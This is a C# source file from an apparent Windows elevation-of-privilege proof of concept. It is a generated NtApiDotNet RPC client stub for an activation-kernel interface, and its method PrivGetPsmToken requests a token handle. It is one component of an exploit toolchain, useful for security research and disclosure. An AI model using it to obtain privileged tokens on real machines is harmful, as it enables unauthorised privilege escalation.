using NtApiDotNet.Ndr.Marshal;
using NtApiDotNet.Win32.Rpc;

namespace PoC_ActKernel_SecurityCallback_EoP
{
    public sealed class Client : RpcClientBase
    {
        public Client() : 
                base("9b8699ae-0e44-47b1-8e7f-86a461d7ecdc", 0, 0)
        {
        }

        public uint PrivGetPsmToken(int p0, int p1, string p2, string p3, out NtApiDotNet.NtToken p4, out int p5)
        {
            NdrMarshalBuffer m = new NdrMarshalBuffer();
            m.WriteInt32(p0);
            m.WriteInt32(p1);
            m.WriteTerminatedString(RpcUtils.CheckNull(p2, "p2"));
            m.WriteTerminatedString(RpcUtils.CheckNull(p3, "p3"));
            var resp = SendReceive(21, m.DataRepresentation, m.ToArray(), m.Handles);
            NdrUnmarshalBuffer u = new NdrUnmarshalBuffer(resp.NdrBuffer, resp.Handles, resp.DataRepresentation);
            p4 = u.ReadSystemHandle<NtApiDotNet.NtToken>();
            p5 = u.ReadInt32();
            return u.ReadUInt32();
        }
    }
}
